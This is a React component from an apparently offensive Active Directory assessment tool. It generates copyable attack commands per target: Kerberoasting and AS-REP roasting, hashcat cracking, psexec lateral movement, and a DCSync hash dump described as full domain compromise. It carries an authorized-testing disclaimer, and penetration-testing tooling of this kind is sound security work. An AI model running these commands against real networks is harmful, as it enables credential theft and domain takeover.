import { useState, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Terminal, Copy, Check, AlertTriangle,
  Cpu, Shield, Key, Lock, ExternalLink, Zap
} from 'lucide-react';
import { useApp } from '../context/AppContext';
import type { AnalyzedTarget } from '../lib/types';
import { severityColor, severityBg } from '../lib/utils';

interface Command {
  label: string;
  command: string;
  category: 'kerberoast' | 'asrep' | 'crack' | 'pivot' | 'enum';
  tool: string;
  notes?: string;
}

function buildCommands(target: AnalyzedTarget): Command[] {
  const cmds: Command[] = [];
  const username = target.user.name;
  const shortName = username.includes('\\') ? username.split('\\')[1] : username;
  const domain = username.includes('\\') ? username.split('\\')[0] : 'DOMAIN';
  const hcMode = target.attackType === 'asrep' ? 18200 : 13100;
  const hcFormatLabel = target.attackType === 'asrep' ? 'AS-REP hash' : 'TGS ticket';

  if (target.attackType === 'kerberoast' || target.attackType === 'both') {
    cmds.push({
      label: 'Kerberoast with Impacket',
      command: `GetUserSPNs.py ${domain}/<USER>:<PASS> -request -outputfile kerberoast_${shortName}.txt`,
      category: 'kerberoast',
      tool: 'impacket',
      notes: 'Requests TGS ticket for all SPNs. Requires domain credentials.'
    });
    cmds.push({
      label: 'Kerberoast with Rubeus',
      command: `Rubeus.exe kerberoast /user:${shortName} /rc4opsec /nowrap /outfile:kerberoast_${shortName}.txt`,
      category: 'kerberoast',
      tool: 'Rubeus.exe',
      notes: 'Run from domain-joined machine. /rc4opsec requests RC4 downgrade.'
    });
    cmds.push({
      label: 'Targeted Kerberoast (PowerView)',
      command: `Invoke-Kerberoast -Identity ${shortName} -OutputFormat Hashcat | Export-Csv kerberoast_${shortName}.csv`,
      category: 'kerberoast',
      tool: 'PowerView',
    });
  }

  if (target.attackType === 'asrep' || target.attackType === 'both') {
    cmds.push({
      label: 'AS-REP Roast with Impacket',
      command: `GetNPUsers.py ${domain}/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep_${shortName}.txt`,
      category: 'asrep',
      tool: 'impacket',
      notes: 'No credentials required. Target accounts with pre-auth disabled.'
    });
    cmds.push({
      label: 'AS-REP Roast with Rubeus',
      command: `Rubeus.exe asreproast /user:${shortName} /format:hashcat /outfile:asrep_${shortName}.txt`,
      category: 'asrep',
      tool: 'Rubeus.exe',
    });
  }

  // Crack commands
  cmds.push({
    label: `Hashcat (mode ${hcMode}) — ${hcFormatLabel}`,
    command: `hashcat -m ${hcMode} ${target.attackType === 'asrep' ? `asrep_${shortName}.txt` : `kerberoast_${shortName}.txt`} wordlist.txt -r rules/best64.rule --force`,
    category: 'crack',
    tool: 'hashcat',
    notes: `Mode ${hcMode}. RC4 tickets run 100M+ H/s on modern GPU.`
  });

  if (target.encryptionType === 'RC4') {
    cmds.push({
      label: 'Hashcat — RC4 with rockyou',
      command: `hashcat -m ${hcMode} hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O`,
      category: 'crack',
      tool: 'hashcat',
      notes: 'RC4 is fast to crack. Use -O for optimized kernels.'
    });
  }

  // Post-exploitation if privileged
  if (target.privilegedGroups.length > 0 || target.daDistance <= 2) {
    cmds.push({
      label: 'Lateral movement with CrackMapExec',
      command: `crackmapexec smb <TARGET_IP> -u ${shortName} -p '<CRACKED_PASS>' --shares`,
      category: 'pivot',
      tool: 'CrackMapExec',
      notes: 'Verify credential against domain controllers and file shares.'
    });
    cmds.push({
      label: 'PTH / Ticket Pass with Impacket',
      command: `psexec.py ${domain}/${shortName}:'<CRACKED_PASS>'@<DC_IP>`,
      category: 'pivot',
      tool: 'impacket',
      notes: 'Direct shell if credentials valid. Check for local admin.'
    });
  }

  if (target.daDistance <= 2) {
    cmds.push({
      label: 'DCSync (if DA path confirmed)',
      command: `secretsdump.py ${domain}/${shortName}:'<CRACKED_PASS>'@<DC_IP> -just-dc-ntlm`,
      category: 'pivot',
      tool: 'impacket',
      notes: 'Full domain compromise — dumps all NTLM hashes from DC. Only if DA path valid.'
    });
  }

  // Enum
  cmds.push({
    label: 'BloodHound path analysis',
    command: `bloodhound-python -u ${shortName} -p '<CRACKED_PASS>' -d ${domain} -c All --zip`,
    category: 'enum',
    tool: 'bloodhound-python',
    notes: 'Run after credential is cracked to enumerate privilege paths.'
  });

  return cmds;
}

const CATEGORY_META: Record<string, { label: string; color: string; bg: string; icon: React.ReactNode }> = {
  kerberoast: { label: 'Kerberoast', color: '#00C2FF', bg: 'rgba(0,194,255,0.08)', icon: <Key size={12} /> },
  asrep: { label: 'AS-REP', color: '#A78BFA', bg: 'rgba(167,139,250,0.08)', icon: <Lock size={12} /> },
  crack: { label: 'Crack', color: '#FF8C00', bg: 'rgba(255,140,0,0.08)', icon: <Cpu size={12} /> },
  pivot: { label: 'Pivot / PE', color: '#FF3A5C', bg: 'rgba(255,58,92,0.08)', icon: <Zap size={12} /> },
  enum: { label: 'Enum', color: '#00E4A3', bg: 'rgba(0,228,163,0.08)', icon: <ExternalLink size={12} /> },
};

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = useCallback(() => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }, [text]);

  return (
    <motion.button
      onClick={copy}
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
      className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-[11px] font-mono transition-all"
      style={{
        background: copied ? 'rgba(0,228,163,0.12)' : 'rgba(0,194,255,0.08)',
        border: copied ? '1px solid rgba(0,228,163,0.3)' : '1px solid rgba(0,194,255,0.15)',
        color: copied ? '#00E4A3' : '#00C2FF',
      }}
    >
      {copied ? <Check size={11} /> : <Copy size={11} />}
      {copied ? 'Copied' : 'Copy'}
    </motion.button>
  );
}

function CommandCard({ cmd, index }: { cmd: Command; index: number }) {
  const meta = CATEGORY_META[cmd.category];
  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: index * 0.05 }}
      className="rounded-xl overflow-hidden"
      style={{
        background: 'rgba(19,28,46,0.7)',
        border: '1px solid rgba(255,255,255,0.06)',
      }}
    >
      {/* Command header */}
      <div className="flex items-center justify-between px-4 py-2.5"
        style={{ background: 'rgba(11,17,32,0.5)', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
        <div className="flex items-center gap-2">
          <span className="flex items-center gap-1.5 text-[10px] font-mono font-semibold px-2 py-0.5 rounded-full"
            style={{ background: meta.bg, color: meta.color, border: `1px solid ${meta.color}22` }}>
            {meta.icon}
            {meta.label}
          </span>
          <span className="text-xs font-medium" style={{ color: '#EEF2FF' }}>{cmd.label}</span>
          <span className="text-[10px] font-mono px-1.5 py-0.5 rounded"
            style={{ background: 'rgba(255,255,255,0.04)', color: 'rgba(126,143,168,0.6)' }}>
            {cmd.tool}
          </span>
        </div>
        <CopyButton text={cmd.command} />
      </div>

      {/* Command body */}
      <div className="px-4 py-3">
        <pre className="text-[12px] font-mono whitespace-pre-wrap break-all"
          style={{ color: '#A5F3FC', lineHeight: 1.6 }}>
          {cmd.command}
        </pre>
        {cmd.notes && (
          <p className="text-[11px] mt-2 flex items-start gap-1.5" style={{ color: 'rgba(126,143,168,0.6)' }}>
            <AlertTriangle size={10} className="mt-0.5 flex-shrink-0" style={{ color: 'rgba(255,208,36,0.5)' }} />
            {cmd.notes}
          </p>
        )}
      </div>
    </motion.div>
  );
}

export function CommandCenter() {
  const { state } = useApp();
  const { targets } = state;
  const [selectedTarget, setSelectedTarget] = useState<AnalyzedTarget | null>(targets[0] ?? null);
  const [categoryFilter, setCategoryFilter] = useState<string>('all');
  const [copiedAll, setCopiedAll] = useState(false);

  const commands = selectedTarget ? buildCommands(selectedTarget) : [];
  const filtered = categoryFilter === 'all' ? commands : commands.filter(c => c.category === categoryFilter);

  const copyAll = useCallback(() => {
    const text = filtered.map(c => `# ${c.label}\n${c.command}`).join('\n\n');
    navigator.clipboard.writeText(text).then(() => {
      setCopiedAll(true);
      setTimeout(() => setCopiedAll(false), 2000);
    });
  }, [filtered]);

  const criticalCount = targets.filter(t => t.severity === 'critical').length;

  return (
    <div className="h-full flex flex-col" style={{ background: '#060A12' }}>
      {/* Header */}
      <div className="flex items-center justify-between px-5 py-3.5 flex-shrink-0 border-b"
        style={{ borderColor: 'rgba(0,194,255,0.08)', background: 'rgba(11,17,32,0.8)', backdropFilter: 'blur(20px)' }}>
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-xl flex items-center justify-center"
            style={{ background: 'linear-gradient(135deg, rgba(0,194,255,0.2), rgba(167,139,250,0.2))', border: '1px solid rgba(0,194,255,0.2)' }}>
            <Terminal size={15} style={{ color: '#00C2FF' }} />
          </div>
          <div>
            <h1 className="font-semibold text-sm" style={{ color: '#EEF2FF' }}>Command Center</h1>
            <p className="text-[11px]" style={{ color: 'rgba(126,143,168,0.6)' }}>
              Ready-to-execute attack commands for {targets.length} targets · {criticalCount} CRITICAL priority
            </p>
          </div>
        </div>

        {selectedTarget && (
          <div className="flex items-center gap-2">
            <button
              onClick={copyAll}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-mono transition-all"
              style={{
                background: copiedAll ? 'rgba(0,228,163,0.1)' : 'rgba(0,194,255,0.08)',
                border: copiedAll ? '1px solid rgba(0,228,163,0.3)' : '1px solid rgba(0,194,255,0.15)',
                color: copiedAll ? '#00E4A3' : '#00C2FF',
              }}
            >
              {copiedAll ? <Check size={12} /> : <Copy size={12} />}
              {copiedAll ? 'Copied All' : 'Copy All Commands'}
            </button>
          </div>
        )}
      </div>

      <div className="flex-1 flex overflow-hidden">
        {/* Target list */}
        <div className="w-72 flex-shrink-0 flex flex-col border-r overflow-hidden"
          style={{ borderColor: 'rgba(0,194,255,0.06)', background: 'rgba(8,14,28,0.6)' }}>
          <div className="px-3 py-2.5 border-b flex-shrink-0"
            style={{ borderColor: 'rgba(0,194,255,0.06)' }}>
            <p className="text-[10px] font-mono tracking-widest" style={{ color: 'rgba(0,194,255,0.4)' }}>
              TARGETS — {targets.length}
            </p>
          </div>
          <div className="flex-1 overflow-y-auto py-1.5 px-1.5 space-y-0.5">
            {targets.map((t, i) => {
              const isActive = selectedTarget?.user.objectid === t.user.objectid;
              return (
                <motion.button
                  key={t.user.objectid}
                  onClick={() => setSelectedTarget(t)}
                  whileHover={{ x: 1 }}
                  initial={{ opacity: 0, x: -6 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: i * 0.015 }}
                  className="w-full text-left px-3 py-2.5 rounded-xl transition-all"
                  style={{
                    background: isActive
                      ? 'linear-gradient(135deg, rgba(0,194,255,0.1), rgba(167,139,250,0.06))'
                      : 'transparent',
                    border: isActive ? '1px solid rgba(0,194,255,0.15)' : '1px solid transparent',
                  }}
                >
                  <div className="flex items-center gap-2">
                    <div className="w-1.5 h-1.5 rounded-full flex-shrink-0"
                      style={{ background: severityColor(t.severity), boxShadow: `0 0 6px ${severityColor(t.severity)}` }} />
                    <span className="text-[12px] font-mono font-medium truncate flex-1"
                      style={{ color: isActive ? '#EEF2FF' : 'rgba(126,143,168,0.8)' }}>
                      {t.user.name.split('\\').pop()}
                    </span>
                    <span className="text-[10px] font-mono font-bold flex-shrink-0"
                      style={{ color: '#00C2FF', opacity: isActive ? 1 : 0.4 }}>
                      {t.score}
                    </span>
                  </div>
                  <div className="flex items-center gap-1 mt-1 ml-3.5">
                    <span className="text-[9px] font-mono px-1.5 py-0.5 rounded-full"
                      style={{ background: severityBg(t.severity), color: severityColor(t.severity) }}>
                      {t.severity.toUpperCase()}
                    </span>
                    <span className="text-[9px] font-mono" style={{ color: 'rgba(126,143,168,0.4)' }}>
                      {t.attackType === 'both' ? 'KERB+ASREP' : t.attackType === 'kerberoast' ? 'KERB' : 'ASREP'}
                    </span>
                    <span className="text-[9px] font-mono" style={{ color: 'rgba(126,143,168,0.4)' }}>
                      {t.encryptionType}
                    </span>
                  </div>
                </motion.button>
              );
            })}
          </div>
        </div>

        {/* Command panel */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {selectedTarget ? (
            <>
              {/* Target header */}
              <div className="flex-shrink-0 px-5 py-3 border-b"
                style={{ borderColor: 'rgba(0,194,255,0.06)', background: 'rgba(11,17,32,0.4)' }}>
                <div className="flex items-center gap-3">
                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full animate-pulse"
                      style={{ background: severityColor(selectedTarget.severity), boxShadow: `0 0 8px ${severityColor(selectedTarget.severity)}` }} />
                    <span className="font-mono font-bold text-sm" style={{ color: '#EEF2FF' }}>
                      {selectedTarget.user.name}
                    </span>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded-full"
                    style={{ background: severityBg(selectedTarget.severity), color: severityColor(selectedTarget.severity), border: `1px solid ${severityColor(selectedTarget.severity)}30` }}>
                    {selectedTarget.severity.toUpperCase()}
                  </span>
                  <span className="text-[11px] font-mono" style={{ color: 'rgba(0,194,255,0.6)' }}>
                    Score: {selectedTarget.score}/100
                  </span>
                  {selectedTarget.privilegedGroups.length > 0 && (
                    <span className="text-[10px] font-mono" style={{ color: 'rgba(255,140,0,0.7)' }}>
                      ↳ {selectedTarget.privilegedGroups[0]}
                    </span>
                  )}
                </div>
                <p className="text-[11px] mt-1" style={{ color: 'rgba(126,143,168,0.5)' }}>
                  {selectedTarget.reasonSummary} · {selectedTarget.encryptionType} · {selectedTarget.passwordAgeDays}d password age
                </p>
              </div>

              {/* Category filter */}
              <div className="flex-shrink-0 flex items-center gap-1.5 px-5 py-2.5 border-b"
                style={{ borderColor: 'rgba(0,194,255,0.05)' }}>
                {(['all', 'kerberoast', 'asrep', 'crack', 'pivot', 'enum'] as const).map(cat => {
                  const isActive = categoryFilter === cat;
                  const meta = cat === 'all' ? null : CATEGORY_META[cat];
                  return (
                    <button
                      key={cat}
                      onClick={() => setCategoryFilter(cat)}
                      className="px-2.5 py-1 rounded-lg text-[10px] font-mono font-semibold tracking-wider transition-all"
                      style={{
                        background: isActive
                          ? (meta ? meta.bg : 'rgba(0,194,255,0.1)')
                          : 'rgba(255,255,255,0.03)',
                        border: isActive
                          ? `1px solid ${meta ? meta.color + '40' : 'rgba(0,194,255,0.3)'}`
                          : '1px solid rgba(255,255,255,0.05)',
                        color: isActive ? (meta ? meta.color : '#00C2FF') : 'rgba(126,143,168,0.5)',
                      }}
                    >
                      {cat === 'all' ? 'ALL' : meta!.label.toUpperCase()}
                    </button>
                  );
                })}
                <span className="ml-auto text-[10px] font-mono" style={{ color: 'rgba(126,143,168,0.35)' }}>
                  {filtered.length} commands
                </span>
              </div>

              {/* Commands */}
              <div className="flex-1 overflow-y-auto p-4 space-y-3">
                <AnimatePresence mode="popLayout">
                  {filtered.map((cmd, i) => (
                    <CommandCard key={`${cmd.category}-${i}`} cmd={cmd} index={i} />
                  ))}
                </AnimatePresence>

                {filtered.length === 0 && (
                  <div className="flex flex-col items-center justify-center h-40 opacity-40">
                    <Terminal size={28} style={{ color: '#00C2FF', marginBottom: 8 }} />
                    <p className="text-sm" style={{ color: '#7E8FA8' }}>No commands for this filter</p>
                  </div>
                )}

                {/* Disclaimer */}
                <div className="rounded-xl px-4 py-3 mt-4"
                  style={{ background: 'rgba(255,208,36,0.04)', border: '1px solid rgba(255,208,36,0.1)' }}>
                  <p className="text-[11px] flex items-start gap-2" style={{ color: 'rgba(255,208,36,0.5)' }}>
                    <Shield size={11} className="mt-0.5 flex-shrink-0" />
                    These commands are generated for authorized penetration testing and security assessment purposes only.
                    Ensure proper written authorization before execution. VECTOR operates fully offline — no data leaves this machine.
                  </p>
                </div>
              </div>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center opacity-30">
                <Terminal size={40} style={{ color: '#00C2FF', margin: '0 auto 12px' }} />
                <p style={{ color: '#7E8FA8' }}>Select a target to generate commands</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
